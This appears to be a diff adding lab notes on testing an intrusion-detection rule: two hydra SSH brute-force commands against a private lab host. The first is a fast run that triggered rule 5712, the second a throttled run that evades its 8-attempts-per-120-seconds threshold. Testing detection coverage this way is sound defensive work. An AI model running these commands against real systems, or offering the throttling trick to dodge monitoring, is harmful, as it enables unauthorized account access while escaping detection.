@@ -1,0 +1,6 @@
+# Fast attack (triggered rule 5712 immediately)
+hydra -L ~/userlist.txt -P ~/passlist.txt -t 4 ssh://10.10.10.20
+
+# Slow attack (evaded rule 5712 — one attempt every 20s, stays under
+# the 8-attempts/120s threshold)
+hydra -L ~/userlist.txt -P ~/passlist.txt -c 20 ssh://10.10.10.20
